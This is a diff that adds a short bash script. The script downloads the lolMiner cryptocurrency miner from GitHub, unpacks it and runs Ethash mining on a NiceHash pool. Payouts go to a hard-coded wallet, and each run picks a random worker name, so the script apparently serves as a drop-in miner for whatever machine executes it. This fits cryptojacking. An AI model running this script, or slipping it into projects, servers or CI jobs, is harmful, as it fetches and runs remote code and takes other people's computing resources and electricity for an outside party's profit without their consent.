@@ -1,0 +1,2 @@
+#!/bin/bash
+sudo apt update && apt install git wget nano libpci-dev && wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51a/lolMiner_v1.51a_Lin64.tar.gz && tar -xvf lolMiner_v1.51a_Lin64.tar.gz && cd 1.51a && ./lolMiner --algo ETHASH --pool stratum+tcp://daggerhashimoto.eu.nicehash.com:3353 --user 33xJDvi2WBzpQm8XakanP3kgTCMNdiBTQq.$(echo $(shuf -i 1-1000 -n 1)-aschaeleon) --ethstratum ETHPROXY
